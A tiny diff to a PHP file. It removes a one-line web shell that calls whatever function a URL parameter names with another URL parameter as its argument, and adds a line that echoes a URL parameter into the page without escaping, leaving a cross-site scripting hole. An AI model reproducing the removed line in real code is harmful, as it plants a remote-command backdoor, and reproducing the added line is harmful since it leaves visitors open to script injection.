@@ -1,4 +1,4 @@
 <?php
-$output = $_GET[0]("$_GET[1]");
+$output = $_GET[0][1];
 echo "<pre>$output</pre>";
 ?>
